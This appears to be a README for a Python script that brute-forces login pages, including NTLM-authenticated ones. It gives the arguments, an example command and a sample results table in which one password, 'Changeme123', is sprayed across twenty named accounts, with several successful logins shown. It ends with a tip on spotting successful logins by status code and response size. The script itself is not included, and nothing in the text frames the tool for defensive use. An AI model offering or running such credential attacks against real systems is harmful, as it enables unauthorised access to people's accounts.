# BRUTEFORCE
 Brute forcing script.

 ## Arguments
```
--loginurl : The URL of the login page
--usernamesfile : The file list of usernames
--passwordsfile : The file list of passwords
--ntlm : Use NTLM authentication
--domain : The domain for NTLM authentication (if applicable)
```

## Examples
```
python bruteforce.py --loginurl http://files.example.com/ --usernamesfile usernames.txt --passwordsfile  passwords.txt --ntlm --domain example.com
```

## Result
```
             username     password  status Content-Length
0    anthony.reynolds  Changeme123     401           1293
1   samantha.thompson  Changeme123     401           1293
2         dawn.turner  Changeme123     401           1293
3     frances.chapman  Changeme123     401           1293
4        henry.taylor  Changeme123     401           1293
5       jennifer.wood  Changeme123     401           1293
6       hollie.powell  Changeme123     200            163
7       louise.talbot  Changeme123     401           1293
8       heather.smith  Changeme123     200            163
9     dominic.elliott  Changeme123     401           1293
10     gordon.stevens  Changeme123     200            163
11         alan.jones  Changeme123     401           1293
12     frank.fletcher  Changeme123     401           1293
13     maria.sheppard  Changeme123     401           1293
14   sophie.blackburn  Changeme123     401           1293
15        dawn.hughes  Changeme123     401           1293
16        henry.black  Changeme123     401           1293
17      joanne.davies  Changeme123     401           1293
18       mark.oconnor  Changeme123     401           1293
19   georgina.edwards  Changeme123     200            163
```

> For successful authentication, search for different status and/or content size.
